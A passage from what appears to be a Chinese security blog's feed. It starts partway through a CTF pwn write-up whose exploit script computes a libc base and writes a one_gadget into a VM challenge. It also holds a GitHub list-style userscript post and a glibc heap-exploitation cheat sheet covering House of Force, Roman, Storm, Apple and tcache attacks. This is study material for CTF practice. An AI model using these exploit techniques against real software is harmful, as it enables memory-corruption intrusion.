0xxxxxxxxx</span></span><br><span class="line"><span class="comment"># x /20gx $rebase(0x40c0) 检验</span></span><br><span class="line"><span class="comment"># 可以将寄存器写入我们的内容，0x120开始是我们的内容</span></span><br><span class="line"><span class="comment"># og是便宜，至少用一次sub？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路：</span></span><br><span class="line"><span class="comment"># target写入code-&gt;读取到寄存器中备用</span></span><br><span class="line"><span class="comment"># 找一个libc地址-&gt;在我们的code里写入偏移-&gt;都读到寄存器里做sub出base-&gt;读入og-&gt;相加拿到og真实地址-&gt;将og写入target</span></span><br><span class="line"><span class="comment"># 好他妈的绕啊我操了 payload思路全有但是写着很费劲不知道怎么开始</span></span><br><span class="line"><span class="comment"># vm心魔？？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想办法先算出libc真实的基地址存在一个寄存器里</span></span><br><span class="line"><span class="comment"># onegadget = 0x</span></span><br><span class="line"><span class="comment"># 读取目标写入内容（og的偏移放在3了）</span></span><br><span class="line"><span class="comment"># payload = load(0,0x120,1) + load(0,0x124,2) + add(1,2,3)</span></span><br><span class="line"><span class="comment"># 读取一个偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取一个libc地址</span></span><br><span class="line"><span class="comment"># off: 0x29d90</span></span><br><span class="line"><span class="comment"># 常识：2.35的libc_start_main在栈上存储值偏移为0x29d90</span></span><br><span class="line">one_gadget = <span class="number">0x50a47</span></span><br><span class="line">payload = load(<span class="number">0</span>,<span class="number">0xd38</span>,<span class="number">1</span>) <span class="comment">#哦我sb了读是读8字节</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x140</span>,<span class="number">9</span>) + sub(<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>) <span class="comment"># 4是libc的基地址</span></span><br><span class="line"><span class="comment"># 草拟吗，这个地址在wsl kali里也一直跳</span></span><br><span class="line"><span class="comment"># 算og</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x138</span>,<span class="number">8</span>) + add(<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>) <span class="comment"># 5为og真实值</span></span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">payload += store(<span class="number">0</span>,<span class="number">0x118</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(one_gadget) + p64(<span class="number">0x29d90</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;opcode: &quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;h2 id=&quot;逆向虚拟机结构&quot;&gt;逆向虚拟机结构&lt;/h2&gt;
&lt;p&gt;这道题目的虚拟机还算规整，从main函数开始看，从对虚拟机初始化的函数入手并结合代码执行的函数可以看出，整体的vm结构放在了bss，包括32个通用寄存器，rip，代码指针和代码大小。&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="vm" scheme="https://zjw1nd.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>前端小实践之修复github列表渲染错误</title>
    <link href="https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/"/>
    <id>https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/</id>
    <published>2024-12-16T16:21:39.000Z</published>
    <updated>2024-12-17T02:50:21.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因-问题描述">起因/问题描述</h2><p>今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的<strong>列表</strong>都丢失了前缀。即本来应该是：</p><blockquote><p>1. xxx<br>2. xxx<br>· xxx</p></blockquote><p>但是实际渲染出来的效果只有缩进对齐而没有这些序号和点的前缀，看起来非常的难受，遂开始排查问题。</p><h2 id="检查过程">检查过程</h2><p>首先肯定是检查了源代码，markdown确认没有问题之后去github随便搜了个markdown的教程，发现也有这个问题，看来问题出在本地。</p><p>F12检查了一下源代码，markdown最后会被渲染成list：有序列表和无序列表分别是css中的ol和ul样式，列表项则是<code>&lt;li&gt;</code>。html中会采用<code>&lt;ul&gt;&lt;/ul&gt;</code>标签进行实现。</p><p>检查CSS样式发现，<code>&lt;li&gt;</code>对象的一个元素<code>list-style-type</code>的值居然是none，在注入的样式里覆盖了浏览器自己的User Agent样式。</p><p>打开一个列表显示正常的网站检查一下，要想显示前缀，这一项的值应该是<code>disc</code>才对。同时更换浏览器用手机打开发现是正常的</p><p>虽然我们不知道github提供的样式出了什么问题，但是我们似乎本地也不好修这个问题。</p><h2 id="结果">结果</h2><p>问AI，ai给了我一个tamper monkey的脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         GitHub List Style Fix</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Change github list.</span></span><br><span class="line"><span class="comment">// @author       Zj_W1nd</span></span><br><span class="line"><span class="comment">// @match        https://github.com/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加自定义样式</span></span><br><span class="line">    <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">        ul, ol &#123;</span></span><br><span class="line"><span class="string">            list-style-type: disc !important;</span></span><br><span class="line"><span class="string">            margin-left: 20px !important;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在github网页上强制修改前端的列表style，还真解决了这个问题。这么一搞感觉前端就是疯狂的各种标签和字段。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因-问题描述&quot;&gt;起因/问题描述&lt;/h2&gt;
&lt;p&gt;今天兴致来了上头了想编辑自己的Github主页，写好之后突然发现所有的&lt;strong&gt;列表&lt;/strong&gt;都丢失了前缀。即本来应该是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. xxx&lt;br&gt;
2. xxx&lt;</summary>
      
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
    <category term="前端" scheme="https://zjw1nd.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap总集篇导演剪辑剧场版</title>
    <link href="https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/"/>
    <id>https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/</id>
    <published>2024-12-13T04:00:00.000Z</published>
    <updated>2025-03-17T14:25:00.614Z</updated>
    
    <content type="html"><![CDATA[<p>~~摆了，~~可以参考：</p><ul class="lvl-0"><li class="lvl-2"><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a></li><li class="lvl-2">高版本的思路，包括libcgot表，_rtld_global的攻击等：<a href="https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=%E5%8F%AF%E4%BB%A5%E5%9C%A8%20Bi">https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=可以在 Bi</a><br>上文的总结对于细节更丰富也更好用，我自己也会参考。我自己写的导演剪辑版实在献丑。堆就没有完全透彻过，原理和做题是两码事，本质很简单但是利用链路很复杂。</li></ul><h1>Basic：</h1><h2 id="UAF">UAF</h2><p>free后指针不置空可以再次使用。</p><h2 id="Overflow">Overflow</h2><p>溢出，这个一般用于篡改size或prevsize域比较多，能溢出fd和bk也行。</p><h2 id="Off-By-One">Off By One</h2><p>只能溢出1字节。可以篡改下一个chunk的PREV_INUSE位造成合并等。</p><h2 id="Double-Free">Double Free</h2><p>多次释放同一堆块。接着通过分配可以获得指向同一堆块的多个不同指针。可以类型混淆，也可以获取UAF。</p><ul class="lvl-0"><li class="lvl-2"><p>对于fastbin chunk，PREV_INUSE永远为1，因此double free会有奇效。同时只检查第一块是否double free。</p></li></ul><h2 id="Overlap">Overlap</h2><p>重叠。本质上也是借助上面几个漏洞修改size（向前重叠）或者prevsize（向后重叠）域然后释放。这样就有一个chunk内部的一个额外指针了。<a href="https://zjw1nd.github.io/2023/12/03/How2Heap-2/">（未必）更加细节的介绍</a><br>house of Rabbit也是差不多</p><h2 id="Leak">Leak</h2><h3 id="Unsorted-Bin-Leak">Unsorted Bin Leak</h3><p>unsortedbin中的头部chunk的fd会指向main_arena+88的位置。只有一个chunk的话fd和bk都会指向其中。</p><h3 id="tcache-leak">tcache leak</h3><p>用tcache可以泄露堆的起始地址。</p><h3 id="其他">其他</h3><p>类似的放入bin中然后打出内容的思想都可以。</p><h2 id="hook">hook</h2><p>在2.34之前hook没有移除的情况下我们一直可以通过修改mallochook，freehook，reallochook等函数来劫持控制流。一般来说是将chunk分配到这里然后改成one_gadget。比如<a href="#House_of_Roman">House_of_Roman</a>中针对2.23的<code>malloc_hook-0x23</code>地方的fastbinchunk等等</p><p>然而实际利用中很多时候我们会发现所有的one_gadget都不满足的情况，这种时候该怎么办？下面是一些思路</p><ol><li class="lvl-3"><p>利用realloc_hook。观察<code>__libc_realloc</code>的代码可以发现，前面push了很多参数：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000846</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000846</span>C0                 push    r15             ; Alternative name is <span class="string">&#x27;__libc_realloc&#x27;</span></span><br><span class="line">.text:<span class="number">00000000000846</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000000846</span>C4                 push    r13</span><br><span class="line">.text:<span class="number">00000000000846</span>C6                 push    r12</span><br><span class="line">.text:<span class="number">00000000000846</span>C8                 mov     r13, rsi</span><br><span class="line">.text:<span class="number">00000000000846</span>CB                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000846</span>CC                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000846</span>CD                 mov     rbx, rdi</span><br><span class="line">.text:<span class="number">00000000000846</span>D0                 sub     rsp, <span class="number">38</span>h</span><br><span class="line">.text:<span class="number">00000000000846</span>D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">00000000000846</span>DB                 mov     rax, [rax]</span><br><span class="line">                 test    rax, rax</span><br><span class="line">                 jnz     loc_848E8 ;这里call rax</span><br></pre></td></tr></table></figure><p>realloc调整栈帧og触发，或者利用其他环境触发malloc包括doublefree异常–strdup等</p><p>realloc的意思是，我们在malloc_hook处填上realloc的地址，而在realloc_hook处填上one_gadget的地址，利用realloc调用前的这段push参数对栈帧进行微调。</p><h2 id="一些常识：">一些常识：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>tcache最多64个，每个最大连接7个chunk。下标就是按malloc_align分，以64位为例，0-24大小的对应idx0，25-40对应idx1，41-56对应idx2依次类推每个+16。然后32位就是0-12，13-20这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_MXFAST             <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br></pre></td></tr></table></figure><h1>Glibc 2.23</h1><blockquote><p>无tcache，检查较少，很经典</p></blockquote><h2 id="arena-attack（House-of-Mind-House-of-Gods）">arena attack（House of Mind &amp; House of Gods）</h2><p>实战利用价值小，看个乐</p><h3 id="House-of-mind">House of mind</h3><p>伪造arena，blog没写，是一种通过伪造arena从而将释放的chunk连入假arena的过程，利用比较抽象而且最后似乎还没有任意写。</p><h3 id="House-of-Gods">House of Gods</h3><p>利用arena结构体中的数据和错位实现在main_arena中构建一个chunk进行写入，然后篡改arena的next指针将堆变成我们自己的arena来劫持整个堆。具体参见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a>，虽然非常复杂没什么用但是可以看看这个堆风水的过程，非常的神必，有助于理解main_arena的结构：</p><ol><li class="lvl-3"><p>泄露unsorted bin 头的地址，malloc一个smallchunk然后直接读。通过free+malloc(intm)启动遍历过程，将位图置位。这个时候我们让bin[0]作为伪造的size域存在。此时它是0x200.</p></li><li class="lvl-3"><p>首先将smallchunk放回unsortedbin中。用上面的leak在main_arena内寻址。利用UAF修改smallchunk的bk，在unsortedbin里面链接上这个伪造chunk。</p></li><li class="lvl-3"><p>利用malloc_state的特性，修改fastbin chunk的bk字段然后将其释放，控制其在malloc_state的开头，接着作为一个伪造的bk字段存在，链接到INTM。巧妙至极。</p><blockquote><p>这时候的unsorted bin：head-&gt;smallchunk-&gt;binmap[last]（伪造的）-&gt;main_arena的开头（由于next指针开始就是指向本身的）-&gt;fast40-&gt;INTM</p></blockquote></li><li class="lvl-3"><p>将binmap chunk作为一个“chunk”取出。得到了写入main_arena（即便是部分）的权限！开始为触发<code>reused_arena()</code>的条件铺路。</p></li><li class="lvl-3"><p>接着UAF改INTM的bk，让INTM后面再连接上narenas字段。然后取出INTM触发unsortedbin attack，将narenas写为一个大数。同时用binmap chunk，改掉system_mem字段。</p></li><li class="lvl-3"><p>用binmap chunk将arena的next指针随便写成你想分配的地址</p></li><li class="lvl-3"><p>连续调用两次<code>malloc(0xffffffffffffffbf + 1)</code>，arena直接全部hijack掉。</p></li><li class="lvl-3"><p>随便操。</p></li></ol><h2 id="Top-chunk-related-attack（House-of-Force-House-of-Orange）">Top chunk related attack（House of Force &amp; House of Orange）</h2><p>利用topchunk的一些特性达成我们的目的。House of Force可以实现任意地址分配，House of Orange可以实现不调用free情况下的一次释放。</p><h3 id="House-of-Force">House of Force</h3><p>见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a><br>将top chunk的size域改到极大，然后通过分配evil_size的chunk将topchunk推进到我们想分配的地址，随后下次分配就会从top中切出我们指定地址的chunk。</p><ul class="lvl-0"><li class="lvl-2"><p>其中top的size一般写成-1，evil_size的计算如下</p></li></ul><blockquote><p>new_top = old_top + nb<br>nb = new_top - old_top<br>req + 2sizeof(long) = new_top - old_top<br>req = new_top - old_top - 2sizeof(long)<br>req = dest - 2sizeof(long) - old_top - 2sizeof(long)<br>req = dest - old_top - 4*sizeof(long)</p></blockquote><h3 id="House-of-Orange">House of Orange</h3><p>见<a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">How2Heap4</a><br>神中神，适用于没有free的情况。通过先改小top chunk的size域然后申请一个较大的chunk来触发sysmalloc中的brk扩展，就会将旧的top放进unsortedbin中。</p><ul class="lvl-0"><li class="lvl-2"><p>top的size需要页对齐，动调确定，一般改为0xfe1然后申请0x1000刚好。</p></li><li class="lvl-2"><p>新申请的会放在新的内存页。</p></li><li class="lvl-2"><p>【glibc 2.23】借助unsorted bin attack改写IO_LIST_ALL为unsorted(av)后将old top放入smallbins[4](改写size为0x61)从而实现用伪造chunk链接至IO_list_all触发fsop。</p></li></ul><h2 id="Fastbin（normal-house-of-spirit-House-of-Rabbit）">Fastbin（normal, house of spirit, House of Rabbit）</h2><p><a href="https://zjw1nd.github.io/2023/11/09/How2Heap-1/">（未必）更加细节的介绍</a></p><h3 id="Normal-fast-bin-attack：">Normal fast bin attack：</h3><p>将一个fastbin分配在我们想要的位置。通过劫持已在fastbin中的一个chunk的fd指针来做到这一点。</p><ul class="lvl-0"><li class="lvl-2"><p>会检查size域，需要提前伪装。</p></li><li class="lvl-2"><p>分配在malloc_hook或free_hook的话经常配合0x7f的字节错位来伪造size域</p></li><li class="lvl-2"><p>UAF和Double free，fastbin在2.23中只检查头部是否double free从而我们可以用dup来实现Write after free</p></li></ul><h3 id="House-of-Spirit">House of Spirit</h3><p>伪造fastbin的chunk。通过free放入bin。需要注意：</p><ul class="lvl-0"><li class="lvl-2"><p>边界0x10对齐</p></li><li class="lvl-2"><p>size域大小合适，满足fastbin要求</p></li><li class="lvl-2"><p>next的地址不能是top，而且size要正常（不用必须是fastbin）</p></li></ul><h3 id="House-of-Rabbit">House of Rabbit</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>针对consolidate不严格检查size的fastbin attack. 要能修改size域并且有触发consolidate的条件</p><ul class="lvl-0"><li class="lvl-2"><p>修改size，然后触发consolidate变成overlap。</p></li><li class="lvl-2"><p>修改fd然后触发consolidate将fake_chunk放入bin中变成合法chunk（注意伪造size）</p></li></ul><h2 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>利用Unsorted Bin取出chunk时候的这个特性（双向链表，bk遍历）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>控制住unsorted bin中的下一个会取出的chunk的bk域，我们就能将一个大数（<code>unsorted_chunks(av)</code>）写入我们想要的地址，由于是fd偏移，所以将chunk中的bk写成targetaddr-16即可。可以用于篡改循环次数或<code>GLOBAL_MAX_FAST</code>等。</p><h2 id="House-of-Lore（Small-bin-attack）">House of Lore（Small bin attack）</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>smallbin attack。一个UAF改一下smallchunk的fd就是任意地址fakechunk分配。只要能绕过smallbin分配唯一的检查就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Large-Bin-Attack">Large Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">参考</a><br>利用large bin的指针将指定地址的内容写成一个合法的large chunk的地址。将已经在largebin中的chunk的bk或bk_nextsize篡改为target-16、-32即可实现在下一次victim放入largebin时触发将victim写入target的效果。</p><ul class="lvl-0"><li class="lvl-2"><p>从 unsorted bin 中来的 large chunk 要紧跟在攻击过的large chunk后面，也就是要连在一个bin里，大小也要相邻。</p></li><li class="lvl-2"><p>可以篡改io_list_all进行fsop</p></li><li class="lvl-2"><p>可以帮助tcache smash unlink？</p></li></ul><h2 id="COMBO-FISTS-（House-of-Roman-House-of-Storm）">COMBO FISTS （House of Roman, House of Storm）</h2><p><span id="House_of_Roman"></span></p><h3 id="House-of-Roman（组合拳，getshell思路很常用而且允许爆破-Fastbin-atk-Unsorted-bin-atk）">House of Roman（组合拳，getshell思路很常用而且允许爆破, Fastbin atk + Unsorted bin atk）</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>通过分配一个malloc_hook附近的chunk（确切的说是在<code>malloc_hook-0x23</code>处获取一个fastbinchunk）写入one_gadget。<br>这个思路是非常好的，只要是2.23并且任意地址分配chunk就可以用来getshell。有libc地址最好，没有也没关系借助unsorted bin attack+爆破来实现。<br>原poc的流程如下：</p><ul class="lvl-0"><li class="lvl-2"><p>拿一个0x60的fastbin chunk 1（实际大小0x70）</p></li><li class="lvl-2"><p>分配一个不用的chunk，大小0x80，实际大小0x90，此时相对堆基址的偏移来到了0x100，这灵性的一步是为了待会我们改一个字节就能修改指针指向的chunk</p></li><li class="lvl-2"><p>分配一个0x80的chunk 2，等会放入unsorted bin，chunk2的地址此时是0x100对齐的</p></li><li class="lvl-2"><p>分配一个0x60的fastbin chunk 3，该chunk的偏移地址来到了0x190</p></li><li class="lvl-2"><p>释放chunk2，放入unsorted bin，此时其fd和bk存有main_arena+0x68</p></li><li class="lvl-2"><p>取0x60大小的chunk4（fake_libc_chunk），会从chunk2中进行分割，带有main_arena地址</p></li><li class="lvl-2"><p>读取取出的chunk4，泄露main_arena地址然后计算偏移获取malloc_hook</p></li><li class="lvl-2"><p>释放chunk3，放入fastbin</p></li><li class="lvl-2"><p>释放chunk1，接入fastbin链表头，其fd指向chunk3（0x190）</p></li><li class="lvl-2"><p>模拟一个UAF，写chunk1的fd一字节0x00将其fd指向0x100的chunk2（chunk 4）</p></li><li class="lvl-2"><p>写chunk4，修改低位地址令其fd指向目标地址</p></li><li class="lvl-2"><p>最后将fastbin中的chunk1和3取出，再次取就取到了malloc_hook-0x23处的chunk</p></li></ul><h3 id="House-of-Storm-unsorted-bin-atk-largebin-atk">House of Storm (unsorted bin atk + largebin atk)</h3><blockquote><p>BLOG没有写懒得补了写在这里，该技术实现任意地址chunk分配<br>2.26-2.28 需要tcache填满，再往后该漏洞不可用这个技术最关键的一步是largebin attack将fake_chunk地址写上一个堆地址，而且非常巧妙的利用了一个字节错位将其作为了size。下面是POC的流程</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>准备一个unsortedbin堆块一个largebin堆块，其中unsortedbin中的堆块要比largebin中的大 （还要防止top合并）</p></li><li class="lvl-2"><p>将unsortedbin的地址进行一下处理，算出一个移位偏移量。</p></li><li class="lvl-2"><p>将unsorted bin的chunk bk写为fake_chunk，将large chunk的bk写成fake_chunk+8</p></li><li class="lvl-2"><p>将large chunk的bk_nextsize写成fake chunk-0x18-shift_amount，shift是我们先前的偏移</p></li><li class="lvl-2"><p>利用一个large_bin attack将unsorted chunk的地址写入一个恰当的位置正好伪造出fakechunk的size</p></li><li class="lvl-2"><p>申请相应大小（堆地址高8位？）即可获得fake_chunk</p></li></ul><h2 id="House-of-Einhejar——off-by-null">House of Einhejar——off by null</h2><p><a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">参考</a><br>仅需off by one就能工作。控制住当前chunk的末8字节（prev_size写成evil_size，差值）然后溢出修改掉下一个chunk的PREV_INUSE位。然后通过free下一个chunk触发合并后，下次分配就能从指定地址取chunk了（prev_size错误合并，overlap）。</p><ul class="lvl-0"><li class="lvl-2"><p>由于off by one，最好溢出的下个chunk的size是0x100对齐的，便于改写</p></li><li class="lvl-2"><p>fakechunk的size要和我们修改的prev_size一致</p></li></ul><h2 id="Unsafe-Unlink">Unsafe Unlink</h2><p>利用Unlink实现overlap或指定地址写（确切地说是将target写成&amp;target-0x18）。但是这个POC中利用所需要的前置条件较多…需要同时修改被unlink的chunk的fd和bk以及下一chunk的prevsize和PREV_INUSE位，要求太高了。</p><h1>glibc 2.27</h1><blockquote><p>这个版本首次引入了tcache<br>下面会着重涉及tcache相关的攻击，同时大部分上面的攻击技巧都要和tcache打交道，比如先填满7个。</p></blockquote><h2 id="Fastbin">Fastbin</h2><p>同上，只是每次要先填满对应大小的7个tcache</p><h2 id="tcache">tcache</h2><p><a href="https://zjw1nd.github.io/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/">参考链接</a></p><h3 id="Same-as-fastbin">Same as fastbin</h3><p>和fastbin一样只不过更简单（没有了fastbin szie检查）。包括double free，house of spirit，tcache poison（对应fastbin attack）等。</p><h3 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h3><p>在有tcache的情况下替代unsorted bin attack实现任意地址写一个libc地址。同时还能构造fake chunk（任意地址chunk分配）。</p><ul class="lvl-0"><li class="lvl-2"><p>tcache空两个，拿到两个small bin和一个small bin的UAF，fake_chunk的bk写入target</p></li><li class="lvl-2"><p>修改后释放的smallbin块的bk为fake_chunk地址，<strong>calloc触发</strong>写入攻击，target被改同时tcache头部会链入fake_chunk</p></li><li class="lvl-2"><p>下次malloc会返回fake_chunk</p></li></ul><h3 id="House-of-botcake">House of botcake</h3><p>double free实现任意堆块分配。</p><ul class="lvl-0"><li class="lvl-2"><p>用0x110的堆块填满tcache，然后再释放两个相邻的0x110堆块（先a后b）放入unsorted bin并导致合并</p></li><li class="lvl-2"><p>取出一个0x110的chunk（从tcache），然后再次释放上一步中的a块，a块此时被放入tcache，这里形成了一个重叠</p></li><li class="lvl-2"><p>分配一个0x130的堆块，这会从unsorted bin中合并好的块切割，而这时候我们取得的这个chunk可以拿来修改tcache头部的a块</p></li><li class="lvl-2"><p>修改fd后malloc两次即可</p></li></ul><h1>glibc 2.34+</h1><h2 id="Glibc-2-31-House-of-Pig">Glibc 2.31 House of Pig</h2><h2 id="House-of-Kiwi">House of Kiwi</h2><h2 id="House-of-Apple">House of Apple</h2><p>一种思想。在glibc 2.34+的版本中已经没有了malloc_hook这种函数让我们一次就能getshell。堆利用的思想更多的集中到了FSOP上。</p><h3 id="v1">v1</h3><h3 id="v2">v2</h3><p>参考<a href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heap实战——强网杯2024babyheap</a>的板子用一次largebin attack将io_list_all劫持，然后将vtable换成wide版本来让内核从wvtable找函数调用从而规避检查，*（wdata+0xe0）+0x68就是能劫持控制流的地方。</p><p>值得注意的是，在我们劫持的时候，rdi中存放的是fp的地址（也就是我们劫持到的堆地址，借助一些gadget以及setcontext这种我们能够控制几乎所有的寄存器，只要堆上布局合理。<br>在setcontext最后会将[rdx+0xa8]的内容push到栈上然后ret，这也是我们ROP链路的开始。</p><h3 id="v3">v3</h3><h2 id="House-of-Banana">House of Banana</h2><p>攻击_rtld_global的一种方法。劫持rtld_global到可写堆块后通过伪造程序基地址或者finiarray的办法，让程序在调用exit()退出的时候执行我们想要执行的函数。<br>rtld_global的第一字段是linkmap结构体的地址，无论是伪造linkmap还是篡改本来的，再或者改掉程序基地址，我们最终是要让</p><h2 id="House-of-Emma">House of Emma</h2><h2 id="tlor-list">tlor_list</h2><h2 id="Libc-GOT">Libc_GOT</h2><h2 id="io-obstack">io_obstack</h2><h2 id="House-of-Cat">House of Cat</h2><h2 id="House-of-Water-glibc-2-39-newest">House of Water(glibc 2.39 newest)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;~~摆了，~~可以参考：&lt;/p&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31&quot;&gt;https://bbs.kan</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap-rust——qwb2024_chat-with-me</title>
